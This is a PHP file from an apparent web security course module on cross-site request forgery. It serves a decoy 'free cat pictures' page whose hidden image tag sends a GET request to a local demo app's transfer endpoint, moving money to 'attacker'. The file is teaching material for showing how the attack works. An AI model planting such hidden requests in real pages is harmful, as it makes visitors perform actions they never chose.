<?php

/**
 * router.php (the "attacker site")
 *
 * Module 09: CSRF via GET.
 *
 * PHP equivalent of node/attacker/server.js -- serves the identical
 * "free cat pictures" page with the same hidden <img> CSRF payload.
 *
 * Introduced in: Module 09.
 * Prerequisite concepts: Module 04 (Idempotency & Safety).
 */

declare(strict_types=1);

header('Content-Type: text/html; charset=utf-8');
echo <<<'HTML'
<!DOCTYPE html><html><head><meta charset="utf-8"><title>Free Cat Pictures</title></head>
<body style="font-family:sans-serif;max-width:640px;margin:40px auto;">
  <h1>100% Legitimate Free Cat Pictures (PHP)</h1>
  <p>Nothing suspicious here. Definitely just cats.</p>
  <img src="http://localhost:8000/transfer?to=attacker&amount=100" style="display:none" alt="">
</body></html>
HTML;
